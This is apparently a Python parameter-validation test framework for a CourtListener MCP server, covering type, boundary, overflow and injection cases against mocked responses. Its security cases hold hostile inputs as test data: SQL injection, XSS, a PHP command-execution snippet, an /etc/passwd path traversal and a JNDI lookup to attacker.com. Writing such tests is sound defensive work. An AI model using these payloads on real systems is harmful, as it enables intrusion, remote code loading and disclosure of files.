#!/usr/bin/env python3
"""
CourtListener MCP Server - Parameter Validation Test Framework

Comprehensive parameter validation testing framework for all MCP tools.
Tests security, edge cases, type validation, and boundary conditions.

Usage:
    from tests.utils.parameter_validation_framework import ParameterValidationFramework
    
    framework = ParameterValidationFramework()
    await framework.test_all_parameter_scenarios(tool_name, mcp_server, tool_params)
"""

import asyncio
import logging
from enum import Enum
from typing import Dict, List, Any, Optional, Union
from unittest.mock import patch, MagicMock
from dataclasses import dataclass
import string
import datetime
from decimal import Decimal

logger = logging.getLogger(__name__)


class ValidationTestType(Enum):
    """Types of parameter validation tests."""
    TYPE_VALIDATION = "type_validation"
    BOUNDARY_TESTING = "boundary_testing"
    SECURITY_INJECTION = "security_injection"
    SPECIAL_CHARACTERS = "special_characters"
    NULL_EMPTY_VALIDATION = "null_empty_validation"
    OVERFLOW_TESTING = "overflow_testing"
    FORMAT_VALIDATION = "format_validation"
    CROSS_FIELD_VALIDATION = "cross_field_validation"
    REQUIRED_FIELD_VALIDATION = "required_field_validation"


@dataclass
class ParameterTestCase:
    """Definition of a parameter validation test case."""
    test_type: ValidationTestType
    parameter_name: str
    test_value: Any
    expected_behavior: str  # "accept", "reject", "sanitize"
    description: str
    security_risk_level: str  # "low", "medium", "high", "critical"


class ParameterValidationFramework:
    """Framework for comprehensive parameter validation testing."""
    
    def __init__(self):
        self.validation_patterns = self._define_validation_patterns()
    
    def _define_validation_patterns(self) -> Dict[str, List[ParameterTestCase]]:
        """Define validation test patterns for different parameter types."""
        return {
            # String parameter patterns
            "string": [
                # Type validation
                ParameterTestCase(
                    ValidationTestType.TYPE_VALIDATION,
                    "string_param",
                    123,
                    "accept",  # Most tools convert to string
                    "Integer passed to string parameter",
                    "low"
                ),
                ParameterTestCase(
                    ValidationTestType.TYPE_VALIDATION,
                    "string_param",
                    None,
                    "accept",
                    "None value for string parameter",
                    "low"
                ),
                ParameterTestCase(
                    ValidationTestType.TYPE_VALIDATION,
                    "string_param",
                    [],
                    "accept",
                    "List passed to string parameter",
                    "medium"
                ),
                
                # Security injection tests
                ParameterTestCase(
                    ValidationTestType.SECURITY_INJECTION,
                    "string_param",
                    "'; DROP TABLE opinions; --",
                    "accept",  # CourtListener is read-only search API
                    "SQL injection attempt (search query)",
                    "low"  # No SQL modification operations in API
                ),
                ParameterTestCase(
                    ValidationTestType.SECURITY_INJECTION,
                    "string_param",
                    "<script>alert('XSS')</script>",
                    "accept",  # XSS handled at frontend rendering level
                    "XSS injection attempt (search query)",
                    "low"  # Search API, not data modification
                ),
                ParameterTestCase(
                    ValidationTestType.SECURITY_INJECTION,
                    "string_param",
                    "javascript:alert('XSS')",
                    "accept",  # Processed as search term
                    "JavaScript protocol injection (search query)",
                    "low"
                ),
                ParameterTestCase(
                    ValidationTestType.SECURITY_INJECTION,
                    "string_param",
                    "<?php system($_GET['cmd']); ?>",
                    "accept",  # No server-side code execution in search API
                    "PHP code injection attempt (search query)",
                    "low"  # Read-only search operations
                ),
                
                # Special characters
                ParameterTestCase(
                    ValidationTestType.SPECIAL_CHARACTERS,
                    "string_param",
                    "test\\x00\\x01\\x02",
                    "sanitize",
                    "Null bytes and control characters",
                    "medium"
                ),
                ParameterTestCase(
                    ValidationTestType.SPECIAL_CHARACTERS,
                    "string_param",
                    "test\n\r\t",
                    "accept",
                    "Newlines, carriage returns, tabs",
                    "low"
                ),
                ParameterTestCase(
                    ValidationTestType.SPECIAL_CHARACTERS,
                    "string_param",
                    "café résumé naïve",
                    "accept",
                    "Unicode characters",
                    "low"
                ),
                ParameterTestCase(
                    ValidationTestType.SPECIAL_CHARACTERS,
                    "string_param",
                    "😀🎉💻",
                    "accept",
                    "Emoji characters",
                    "low"
                ),
                
                # Overflow testing
                ParameterTestCase(
                    ValidationTestType.OVERFLOW_TESTING,
                    "string_param",
                    "A" * 10001,  # Very long string
                    "reject",
                    "Extremely long string (10k chars)",
                    "medium"
                ),
                ParameterTestCase(
                    ValidationTestType.OVERFLOW_TESTING,
                    "string_param",
                    "A" * 1000001,  # 1MB string
                    "reject",
                    "Massive string (1MB)",
                    "high"
                ),
                
                # Null/Empty validation
                ParameterTestCase(
                    ValidationTestType.NULL_EMPTY_VALIDATION,
                    "string_param",
                    "",
                    "accept",
                    "Empty string",
                    "low"
                ),
                ParameterTestCase(
                    ValidationTestType.NULL_EMPTY_VALIDATION,
                    "string_param",
                    "   ",
                    "accept",
                    "Whitespace-only string",
                    "low"
                ),
            ],
            
            # Integer parameter patterns
            "integer": [
                # Type validation
                ParameterTestCase(
                    ValidationTestType.TYPE_VALIDATION,
                    "int_param",
                    "123",
                    "accept",
                    "String number to integer",
                    "low"
                ),
                ParameterTestCase(
                    ValidationTestType.TYPE_VALIDATION,
                    "int_param",
                    "abc",
                    "reject",
                    "Non-numeric string to integer",
                    "medium"
                ),
                ParameterTestCase(
                    ValidationTestType.TYPE_VALIDATION,
                    "int_param",
                    3.14,
                    "accept",
                    "Float to integer conversion",
                    "low"
                ),
                
                # Boundary testing
                ParameterTestCase(
                    ValidationTestType.BOUNDARY_TESTING,
                    "int_param",
                    -1,
                    "reject",
                    "Negative integer (where invalid)",
                    "medium"
                ),
                ParameterTestCase(
                    ValidationTestType.BOUNDARY_TESTING,
                    "int_param",
                    0,
                    "accept",
                    "Zero value",
                    "low"
                ),
                ParameterTestCase(
                    ValidationTestType.BOUNDARY_TESTING,
                    "int_param",
                    2**31 - 1,  # Max 32-bit signed int
                    "accept",
                    "Maximum 32-bit integer",
                    "low"
                ),
                ParameterTestCase(
                    ValidationTestType.BOUNDARY_TESTING,
                    "int_param",
                    2**63 - 1,  # Max 64-bit signed int
                    "accept",
                    "Maximum 64-bit integer",
                    "medium"
                ),
                
                # Overflow testing
                ParameterTestCase(
                    ValidationTestType.OVERFLOW_TESTING,
                    "int_param",
                    2**64,  # Larger than max 64-bit
                    "reject",
                    "Integer overflow",
                    "high"
                ),
            ],
            
            # Boolean parameter patterns
            "boolean": [
                ParameterTestCase(
                    ValidationTestType.TYPE_VALIDATION,
                    "bool_param",
                    "true",
                    "accept",
                    "String 'true' to boolean",
                    "low"
                ),
                ParameterTestCase(
                    ValidationTestType.TYPE_VALIDATION,
                    "bool_param",
                    "false",
                    "accept",
                    "String 'false' to boolean",
                    "low"
                ),
                ParameterTestCase(
                    ValidationTestType.TYPE_VALIDATION,
                    "bool_param",
                    1,
                    "accept",
                    "Integer 1 to boolean",
                    "low"
                ),
                ParameterTestCase(
                    ValidationTestType.TYPE_VALIDATION,
                    "bool_param",
                    0,
                    "accept",
                    "Integer 0 to boolean",
                    "low"
                ),
                ParameterTestCase(
                    ValidationTestType.TYPE_VALIDATION,
                    "bool_param",
                    "maybe",
                    "reject",
                    "Invalid boolean string",
                    "medium"
                ),
            ],
            
            # Date parameter patterns
            "date": [
                ParameterTestCase(
                    ValidationTestType.FORMAT_VALIDATION,
                    "date_param",
                    "2023-13-01",  # Invalid month
                    "reject",
                    "Invalid date - month 13",
                    "medium"
                ),
                ParameterTestCase(
                    ValidationTestType.FORMAT_VALIDATION,
                    "date_param",
                    "2023-02-30",  # Invalid day
                    "reject",
                    "Invalid date - Feb 30",
                    "medium"
                ),
                ParameterTestCase(
                    ValidationTestType.FORMAT_VALIDATION,
                    "date_param",
                    "2023/01/01",  # Wrong format
                    "reject",
                    "Wrong date format (slashes)",
                    "medium"
                ),
                ParameterTestCase(
                    ValidationTestType.FORMAT_VALIDATION,
                    "date_param",
                    "not-a-date",
                    "reject",
                    "Non-date string",
                    "medium"
                ),
                ParameterTestCase(
                    ValidationTestType.BOUNDARY_TESTING,
                    "date_param",
                    "1800-01-01",  # Very old date
                    "accept",
                    "Very old date",
                    "low"
                ),
                ParameterTestCase(
                    ValidationTestType.BOUNDARY_TESTING,
                    "date_param",
                    "2100-12-31",  # Future date
                    "accept",
                    "Future date",
                    "low"
                ),
            ],
            
            # Limit parameter patterns
            "limit": [
                ParameterTestCase(
                    ValidationTestType.BOUNDARY_TESTING,
                    "limit",
                    -1,
                    "reject",
                    "Negative limit",
                    "medium"
                ),
                ParameterTestCase(
                    ValidationTestType.BOUNDARY_TESTING,
                    "limit",
                    0,
                    "reject",
                    "Zero limit",
                    "medium"
                ),
                ParameterTestCase(
                    ValidationTestType.BOUNDARY_TESTING,
                    "limit",
                    1001,  # No documented maximum limit
                    "accept",
                    "Large limit value",
                    "low"  # API handles gracefully
                ),
                ParameterTestCase(
                    ValidationTestType.OVERFLOW_TESTING,
                    "limit",
                    999999999,
                    "accept",  # May timeout but not rejected
                    "Extremely large limit",
                    "medium"  # Performance impact, not security
                ),
            ]
        }
    
    def _get_parameter_type(self, param_name: str, param_value: Any = None) -> str:
        """Determine parameter type from name and value."""
        # Type inference from parameter name
        if param_name in ['limit', 'page_size', 'max_results']:
            return "limit"
        elif param_name.endswith('_id') or param_name in ['id', 'person_id', 'cluster_id', 'docket_id', 'opinion_id']:
            # Special case: court_id is a string identifier in CourtListener API
            if param_name == 'court_id':
                return "string"
            return "integer"
        elif param_name.startswith('date_') or param_name.endswith('_date'):
            return "date"
        elif param_name.startswith('is_') or param_name.startswith('has_') or param_name.startswith('include_'):
            return "boolean"
        elif param_name in ['query', 'text', 'name', 'title', 'description']:
            return "string"
        else:
            # Infer from value type if provided
            if param_value is not None:
                if isinstance(param_value, bool):
                    return "boolean"
                elif isinstance(param_value, int):
                    return "integer"
                elif isinstance(param_value, str):
                    return "string"
            
            # Default to string
            return "string"
    
    def generate_parameter_tests(self, tool_params: Dict[str, Any]) -> List[ParameterTestCase]:
        """Generate comprehensive parameter validation tests for a tool."""
        test_cases = []
        
        for param_name, param_info in tool_params.items():
            param_type = self._get_parameter_type(param_name)
            
            if param_type in self.validation_patterns:
                for pattern in self.validation_patterns[param_type]:
                    # Create test case specific to this parameter
                    test_case = ParameterTestCase(
                        test_type=pattern.test_type,
                        parameter_name=param_name,
                        test_value=pattern.test_value,
                        expected_behavior=pattern.expected_behavior,
                        description=f"{param_name}: {pattern.description}",
                        security_risk_level=pattern.security_risk_level
                    )
                    test_cases.append(test_case)
        
        return test_cases
    
    async def test_parameter_case(
        self,
        tool_name: str,
        mcp_server: Any,
        test_case: ParameterTestCase,
        base_params: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """Test a specific parameter validation case."""
        base_params = base_params or {}
        test_params = base_params.copy()
        test_params[test_case.parameter_name] = test_case.test_value
        
        logger.info(f"Testing {tool_name} - {test_case.description}")
        
        # Mock successful API response for parameter testing
        mock_response = {
            "count": 1,
            "results": [{"id": 1, "test": "data"}]
        }
        
        with patch('httpx.AsyncClient.get') as mock_get:
            mock_get.return_value.json.return_value = mock_response
            mock_get.return_value.status_code = 200
            
            try:
                # Execute the tool with test parameters
                result = await mcp_server.get_tool(tool_name).call(**test_params)
                
                # Analyze the result
                success = isinstance(result, str) and len(result) > 0
                
                # Check if the parameter was properly handled
                param_accepted = True  # If no exception, parameter was accepted
                
                return {
                    "tool_name": tool_name,
                    "test_type": test_case.test_type.value,
                    "parameter_name": test_case.parameter_name,
                    "test_value": str(test_case.test_value)[:100],  # Truncate for logging
                    "expected_behavior": test_case.expected_behavior,
                    "actual_behavior": "accept" if param_accepted else "reject",
                    "description": test_case.description,
                    "security_risk_level": test_case.security_risk_level,
                    "success": success,
                    "result_length": len(result) if isinstance(result, str) else 0,
                    "error": None
                }
                
            except Exception as e:
                # Parameter was rejected (caused exception)
                return {
                    "tool_name": tool_name,
                    "test_type": test_case.test_type.value,
                    "parameter_name": test_case.parameter_name,
                    "test_value": str(test_case.test_value)[:100],
                    "expected_behavior": test_case.expected_behavior,
                    "actual_behavior": "reject",
                    "description": test_case.description,
                    "security_risk_level": test_case.security_risk_level,
                    "success": test_case.expected_behavior == "reject",
                    "error": str(e),
                    "exception_type": type(e).__name__
                }
    
    async def test_all_parameter_scenarios(
        self,
        tool_name: str,
        mcp_server: Any,
        tool_params: Dict[str, Any],
        base_params: Optional[Dict[str, Any]] = None
    ) -> List[Dict[str, Any]]:
        """Test all parameter validation scenarios for a tool."""
        test_cases = self.generate_parameter_tests(tool_params)
        results = []
        
        logger.info(f"🧪 Testing {len(test_cases)} parameter validation scenarios for {tool_name}")
        
        for test_case in test_cases:
            try:
                result = await self.test_parameter_case(tool_name, mcp_server, test_case, base_params)
                results.append(result)
            except Exception as e:
                logger.error(f"Failed to test parameter {test_case.parameter_name} for {tool_name}: {e}")
                results.append({
                    "tool_name": tool_name,
                    "test_type": test_case.test_type.value,
                    "parameter_name": test_case.parameter_name,
                    "success": False,
                    "error": f"Test framework error: {str(e)}"
                })
        
        # Summary
        successful_tests = sum(1 for r in results if r.get("success", False))
        security_failures = sum(1 for r in results if 
                              r.get("security_risk_level") in ["high", "critical"] and not r.get("success", False))
        
        logger.info(f"✅ {successful_tests}/{len(results)} parameter validation tests passed for {tool_name}")
        if security_failures > 0:
            logger.warning(f"⚠️  {security_failures} high/critical security tests failed for {tool_name}")
        
        return results
    
    def generate_parameter_validation_report(self, all_results: List[List[Dict[str, Any]]]) -> str:
        """Generate comprehensive parameter validation report."""
        total_tests = sum(len(tool_results) for tool_results in all_results)
        total_successful = sum(
            sum(1 for test in tool_results if test.get("success", False))
            for tool_results in all_results
        )
        
        # Security analysis
        security_tests = []
        for tool_results in all_results:
            for test in tool_results:
                if test.get("security_risk_level") in ["high", "critical"]:
                    security_tests.append(test)
        
        security_failures = sum(1 for test in security_tests if not test.get("success", False))
        
        report = f"""
# CourtListener MCP Server - Parameter Validation Test Report

## Summary
- **Total Parameter Tests**: {total_tests}
- **Successful Tests**: {total_successful}
- **Success Rate**: {(total_successful/total_tests)*100:.1f}%
- **Security Tests**: {len(security_tests)}
- **Security Failures**: {security_failures}
- **Security Risk**: {"🔴 HIGH" if security_failures > 0 else "🟢 LOW"}

## Test Results by Tool

"""
        
        for tool_results in all_results:
            if not tool_results:
                continue
                
            tool_name = tool_results[0]["tool_name"]
            tool_successful = sum(1 for test in tool_results if test.get("success", False))
            
            report += f"### {tool_name}\n"
            report += f"- **Tests**: {len(tool_results)}\n"
            report += f"- **Passed**: {tool_successful}\n"
            report += f"- **Success Rate**: {(tool_successful/len(tool_results))*100:.1f}%\n"
            
            # Security analysis for this tool
            tool_security_failures = [test for test in tool_results 
                                    if test.get("security_risk_level") in ["high", "critical"] 
                                    and not test.get("success", False)]
            
            if tool_security_failures:
                report += f"- **⚠️  Security Issues**: {len(tool_security_failures)}\n"
                for test in tool_security_failures:
                    report += f"  - {test['parameter_name']}: {test['description']} (Risk: {test['security_risk_level']})\n"
            
            report += "\n"
        
        # High-risk security failures summary
        if security_failures > 0:
            report += "\n## 🚨 Critical Security Issues\n\n"
            critical_failures = [test for test in security_tests 
                                if test.get("security_risk_level") == "critical" 
                                and not test.get("success", False)]
            
            for test in critical_failures:
                report += f"- **{test['tool_name']}**: {test['description']}\n"
                report += f"  - Parameter: `{test['parameter_name']}`\n"
                report += f"  - Test Value: `{test['test_value']}`\n"
                report += f"  - Risk Level: {test['security_risk_level']}\n\n"
        
        return report


# Convenience functions for common parameter validation patterns
async def test_required_parameters(tool_name: str, mcp_server: Any, required_params: List[str]) -> List[Dict[str, Any]]:
    """Test required parameter validation."""
    results = []
    
    for param in required_params:
        test_cases = [
            ParameterTestCase(
                ValidationTestType.REQUIRED_FIELD_VALIDATION,
                param,
                None,
                "reject",
                f"Missing required parameter: {param}",
                "medium"
            ),
            ParameterTestCase(
                ValidationTestType.REQUIRED_FIELD_VALIDATION,
                param,
                "",
                "reject",
                f"Empty required parameter: {param}",
                "medium"
            )
        ]
        
        framework = ParameterValidationFramework()
        for test_case in test_cases:
            result = await framework.test_parameter_case(tool_name, mcp_server, test_case)
            results.append(result)
    
    return results


async def test_security_parameters(tool_name: str, mcp_server: Any, string_params: List[str]) -> List[Dict[str, Any]]:
    """Quick test for security-critical parameter validation."""
    framework = ParameterValidationFramework()
    results = []
    
    security_values = [
        "'; DROP TABLE opinions; --",
        "<script>alert('XSS')</script>",
        "../../../etc/passwd",
        "<?php system($_GET['cmd']); ?>",
        "${jndi:ldap://attacker.com/a}"
    ]
    
    for param in string_params:
        for value in security_values:
            test_case = ParameterTestCase(
                ValidationTestType.SECURITY_INJECTION,
                param,
                value,
                "sanitize",
                f"Security injection test for {param}",
                "critical"
            )
            result = await framework.test_parameter_case(tool_name, mcp_server, test_case)
            results.append(result)
    
    return results 